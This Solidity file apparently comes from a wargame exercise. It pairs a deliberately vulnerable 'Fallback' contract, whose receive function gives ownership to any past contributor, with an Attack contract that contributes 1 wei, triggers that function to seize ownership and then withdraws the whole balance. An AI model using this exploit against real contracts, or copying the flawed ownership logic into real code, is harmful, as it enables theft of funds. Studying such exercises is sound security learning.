// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}

contract Attack{
    Fallback public fb; // Bank合约地址

    // 初始化Bank合约地址
    constructor(Fallback _fb) payable {
        fb = _fb;
    }
    function contributeIt() external payable{
        fb.contribute{value:1}();
    }
    function attackIt() external payable{
        // 先贡献然后转钱 要满足require(msg.value > 0 && contributions[msg.sender] > 0);这个条件
        //fb.contribute{value:1}();
        (bool isSuccess, /* memory data */ ) = payable(address(fb)).call{value: 1 wei}("");
        require(isSuccess, "Failure! Ether not send.");
    }
    function withdrawIt() external payable{
        fb.withdraw();
    }
    receive() external payable {
        
    }
}